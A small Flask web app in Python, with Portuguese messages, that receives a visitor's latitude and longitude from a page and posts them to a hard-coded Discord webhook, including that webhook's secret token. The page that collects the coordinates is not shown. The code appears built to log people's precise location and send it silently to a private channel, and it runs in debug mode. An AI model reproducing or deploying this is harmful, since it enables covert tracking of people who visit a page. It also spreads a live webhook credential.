from flask import Flask, render_template, request, jsonify

app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/location", methods=["POST"])
def get_location():


    def discord_info(lat, long):

        import requests

        WEBHOOK_URL = "https://discord.com/api/webhooks/1354421955381690459/0UT5Cd21QsmdpEEoa3FhD0JEfj27HDNMUmy_UhNeHlbc7V8SMOGxzwDDT6Gatj3qc3Bn"

        embed = {
            "title": "Mensagem Embed",
            "description": "Aqui está uma mensagem embutida com formatação!",
            "color": 16711680,  # Vermelho (RGB convertido para decimal)
            "footer": {"text": "Enviado via Webhook"},
        }

        data = {
            "content": f"Latitude: {lat}\nLongitude: {long}",
            "username": "Meu Bot",
            "embeds": [embed],
        }

        response = requests.post(WEBHOOK_URL, json=data)

        if response.status_code == 204:
            print("Mensagem enviada com sucesso!")
        else:
            print(f"Erro ao enviar mensagem: {response.status_code} - {response.text}")




    data = request.json
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    
    if latitude and longitude:
        print(f"-----------------------------------------------------\nLocalização recebida: Latitude: {latitude}, Longitude: {longitude}\n-----------------------------------------------------\n{latitude}, {longitude}")
        discord_info(latitude, longitude)
        return jsonify({"status": "success", "message": "Localização recebida!"}), 200
    else:
        return jsonify({"status": "error", "message": "Dados inválidos!"}), 400

if __name__ == "__main__":
    app.run(debug=True)
